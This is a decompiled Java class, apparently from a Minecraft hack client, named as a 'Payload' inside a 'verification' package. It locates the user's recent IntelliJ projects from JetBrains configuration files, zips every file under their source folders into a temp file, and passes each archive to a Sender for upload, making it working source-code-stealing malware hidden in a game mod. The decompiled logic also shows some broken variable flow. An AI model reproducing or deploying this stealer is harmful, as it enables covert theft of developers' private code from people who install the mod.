//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.nio.file.attribute.*;
import java.util.zip.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;

public final class Intellij implements Payload
{
    @Override
    public void execute() throws Exception {
        final String workspaces = this.getIntellijWorkspaces();
        assert workspaces != null;
        final File file2;
        File file;
        Arrays.stream(workspaces.split("\n")).forEach(s -> {
            try {
                new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                file = file2;
                this.pack(s, file.getPath());
                Sender.send(file);
            }
            catch (Exception ex) {}
        });
    }
    
    private void pack(final String sourceDirPath, final String zipFilePath) throws IOException {
        final Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
        try (final ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new OpenOption[0]))) {
            final Path pp = Paths.get(sourceDirPath, new String[0]);
            final Path path2;
            final ZipEntry zipEntry;
            final ZipOutputStream zipOutputStream;
            Files.walk(pp, new FileVisitOption[0]).filter(path -> !Files.isDirectory(path, new LinkOption[0])).filter(path -> path.toFile().getPath().contains("src")).forEach(path -> {
                zipEntry = new ZipEntry(path2.relativize(path).toString());
                try {
                    zipOutputStream.putNextEntry(zipEntry);
                    Files.copy(path, zipOutputStream);
                    zipOutputStream.closeEntry();
                }
                catch (IOException ex) {}
                return;
            });
        }
    }
    
    private String getIntellijWorkspaces() {
        try {
            final File folder = new File(System.getProperty("user.home") + "/AppData/Roaming/JetBrains/");
            if (!folder.exists()) {
                return null;
            }
            final StringBuilder sb = new StringBuilder();
            final File[] var2 = folder.listFiles();
            assert var2 != null;
            for (final File folders : var2) {
                if (folders != null && folders.isDirectory()) {
                    final File file = new File(folders.getAbsolutePath() + "/options/recentProjects.xml");
                    if (file.exists()) {
                        final Scanner scanner = new Scanner(file, "UTF-8");
                        boolean log = false;
                        while (scanner.hasNextLine()) {
                            String line = scanner.nextLine();
                            if (log) {
                                if (line.contains("</list>")) {
                                    log = false;
                                }
                                else {
                                    if (line.contains("<list>")) {
                                        continue;
                                    }
                                    line = line.substring(line.indexOf("\"") + 1);
                                    line = line.substring(0, line.lastIndexOf("/>") - 2);
                                    sb.append(line);
                                    try {
                                        final File file2 = new File(line);
                                        if (file2.exists()) {
                                            final String size = file2.isDirectory() ? this.getFolderSize(file2) : this.getFileSize(file2);
                                            if (size != null) {
                                                sb.append(" ");
                                                sb.append(size);
                                            }
                                        }
                                    }
                                    catch (Exception ex) {}
                                    sb.append("\n");
                                }
                            }
                            else {
                                if (!line.contains("<option name=\"recentPaths\">")) {
                                    continue;
                                }
                                log = true;
                            }
                        }
                        scanner.close();
                    }
                }
            }
            return sb.toString().replace("$USER_HOME$", System.getProperty("user.home")).replace("/", "\\");
        }
        catch (Exception var3) {
            return null;
        }
    }
    
    private String getFileSize(final File file) {
        final long bytes = file.length();
        final long kilobytes = bytes / 1024L;
        final long megabytes = kilobytes / 1024L;
        if (megabytes > 0L) {
            return String.format("%,d MB", megabytes);
        }
        return (kilobytes > 0L) ? String.format("%,d KB", kilobytes) : String.format("%,d B", bytes);
    }
    
    private long getFolderSizeData(final File f) {
        long ret = 0L;
        final File[] var3 = f.listFiles();
        assert var3 != null;
        for (final File file : var3) {
            if (file != null) {
                if (file.isDirectory()) {
                    ret += this.getFolderSizeData(file);
                }
                else {
                    ret += file.length();
                }
            }
        }
        return ret;
    }
    
    private String getFolderSize(final File folder) {
        try {
            if (folder == null || !folder.isDirectory()) {
                return null;
            }
            final long bytes = this.getFolderSizeData(folder);
            final long kilobytes = bytes / 1024L;
            final long megabytes = kilobytes / 1024L;
            if (megabytes > 0L) {
                return String.format("%,d MB", megabytes);
            }
            return (kilobytes > 0L) ? String.format("%,d KB", kilobytes) : String.format("%,d B", bytes);
        }
        catch (Exception var7) {
            return null;
        }
    }
}
